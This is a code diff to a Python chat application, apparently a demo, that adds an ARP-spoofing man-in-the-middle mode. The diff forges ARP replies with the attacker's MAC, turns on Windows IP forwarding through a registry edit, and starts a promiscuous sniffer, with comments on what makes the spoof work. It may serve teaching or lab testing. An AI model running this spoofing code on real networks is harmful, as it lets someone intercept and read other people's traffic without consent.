@@ -1032,6 +1032,14 @@ def send_message():
         return jsonify({'success': False, 'error': 'Empty message'})
     
     try:
+        # Re-resolve MAC each time to pick up ARP poisoning!
+        # This simulates a more realistic scenario where ARP cache is used
+        current_mac = resolve_mac(chat_state['target_ip'], chat_state['interface'])
+        if current_mac:
+            if current_mac != chat_state['target_mac']:
+                print(f"[!] MAC changed: {chat_state['target_mac']} -> {current_mac}")
+            chat_state['target_mac'] = current_mac
+        
         # Encrypt message if encryption is enabled
         if use_encryption and CRYPTO_AVAILABLE:
             encrypted_msg = encrypt_message(message)
@@ -1100,33 +1108,61 @@ def get_attack_stats():
     })
 
 
+def enable_ip_forwarding():
+    """Enable IP forwarding on Windows."""
+    import subprocess
+    import platform
+    if platform.system() == 'Windows':
+        try:
+            # Enable IP routing via registry
+            subprocess.run([
+                'reg', 'add', 
+                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
+                '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'
+            ], capture_output=True)
+            print("[ATTACK] IP Forwarding enabled (may require reboot to fully activate)")
+            print("[ATTACK] For immediate effect, also run as Admin:")
+            print("         netsh interface ipv4 set interface <interface_idx> forwarding=enabled")
+        except Exception as e:
+            print(f"[ATTACK] Warning: Could not enable IP forwarding: {e}")
+
+
 def arp_spoof_loop():
     """Continuously send ARP spoofs to both victims."""
     print("[ATTACK] Starting ARP spoof loop...")
+    print(f"[ATTACK] Telling {chat_state['victim1_ip']} that we are {chat_state['victim2_ip']}")
+    print(f"[ATTACK] Telling {chat_state['victim2_ip']} that we are {chat_state['victim1_ip']}")
+    print(f"[ATTACK] Our MAC: {chat_state['our_mac']}")
+    
+    # Try to enable IP forwarding
+    enable_ip_forwarding()
+    
     while chat_state['attack_active']:
         try:
-            # Spoof victim1: tell them we are victim2
-            pkt1 = Ether(dst=chat_state['victim1_mac']) / ARP(
+            # Spoof victim1: tell them we are victim2 (use OUR MAC as hwsrc!)
+            pkt1 = Ether(dst=chat_state['victim1_mac'], src=chat_state['our_mac']) / ARP(
                 op=2,  # is-at (reply)
-                psrc=chat_state['victim2_ip'],
-                pdst=chat_state['victim1_ip'],
-                hwdst=chat_state['victim1_mac']
+                hwsrc=chat_state['our_mac'],  # OUR MAC - this is the key!
+                psrc=chat_state['victim2_ip'],  # Pretend to be victim2
+                hwdst=chat_state['victim1_mac'],
+                pdst=chat_state['victim1_ip']
             )
             sendp(pkt1, iface=chat_state['interface'], verbose=False)
             
-            # Spoof victim2: tell them we are victim1
-            pkt2 = Ether(dst=chat_state['victim2_mac']) / ARP(
+            # Spoof victim2: tell them we are victim1 (use OUR MAC as hwsrc!)
+            pkt2 = Ether(dst=chat_state['victim2_mac'], src=chat_state['our_mac']) / ARP(
                 op=2,
-                psrc=chat_state['victim1_ip'],
-                pdst=chat_state['victim2_ip'],
-                hwdst=chat_state['victim2_mac']
+                hwsrc=chat_state['our_mac'],  # OUR MAC - this is the key!
+                psrc=chat_state['victim1_ip'],  # Pretend to be victim1
+                hwdst=chat_state['victim2_mac'],
+                pdst=chat_state['victim2_ip']
             )
             sendp(pkt2, iface=chat_state['interface'], verbose=False)
             
             chat_state['arp_spoofs_sent'] += 2
             
             import time
-            time.sleep(2)
+            time.sleep(1)  # Send more frequently
         except Exception as e:
             print(f"[ATTACK] Spoof error: {e}")
             break
@@ -1337,9 +1373,10 @@ def main():
             sys.exit(1)
         print(f"Victim 2 MAC: {chat_state['victim2_mac']}")
         
-        # Start sniffer for attacker mode
+        # Start sniffer for attacker mode (promiscuous mode to see all traffic)
+        print("[*] Starting promiscuous mode sniffer...")
         sniffer_thread = threading.Thread(
-            target=lambda: sniff(iface=args.interface, prn=attacker_packet_handler, store=False),
+            target=lambda: sniff(iface=args.interface, prn=attacker_packet_handler, store=False, promisc=True),
             daemon=True
         )
         sniffer_thread.start()
